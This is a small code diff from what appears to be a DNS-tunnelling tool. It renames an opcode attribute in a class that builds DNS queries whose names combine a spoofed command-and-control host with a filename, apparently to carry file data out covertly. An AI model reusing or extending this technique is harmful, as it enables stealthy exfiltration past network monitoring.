@@ -22,7 +22,7 @@ class DataRequest:
         udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
         dns = DNS(
             qr=PACKET_OPTIONS['DNS']['QR'], # it is a query, not a response
-            opcode=self._type,
+            opcode=self.type,
             qdcount=PACKET_OPTIONS['DNS']['QDCOUNT'],
             ancount=PACKET_OPTIONS['DNS']['ANCOUNT'],
             qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST + reformatted_filename, qtype=RequestType.DATA.value, qclass=self.packet_number),
